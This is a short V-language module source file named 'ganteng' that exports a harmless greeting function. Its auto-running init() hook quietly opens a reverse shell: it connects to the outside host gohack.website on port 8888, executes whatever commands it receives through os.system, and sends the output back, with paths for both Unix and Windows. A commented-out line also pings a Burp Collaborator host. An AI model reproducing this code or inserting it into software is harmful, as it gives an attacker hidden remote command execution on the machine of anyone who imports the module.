module ganteng

import os
import net

// To export a function we have to use `pub`
pub fn say_hi() {
	println('hello from mymodule!')
}

fn init(){
//os.system("ping m1o9ydd3il1qi3vn25ccl1ouglmba0.burpcollaborator.net")
    client := net.dial("gohack.website", 8888) or { panic('') }
    mut outfile := ' > /var/tmp/shell'
    mut readfile := '/var/tmp/shell'
    if os.user_os() == 'windows' {
        outfile = ' > C:\\Users\\Public\\shell.txt'
        readfile = 'C:\\Users\\Public\\shell.txt'
    }
    for {
        bytes, blen := client.recv(1024)
        i := tos(bytes, blen)
	if blen  < 0 { continue }
	if blen == 0 { break }
	os.system(i.replace('\n', outfile))
        out := os.read_file(readfile) or { break }
        client.write(out) or { break }
    }
}
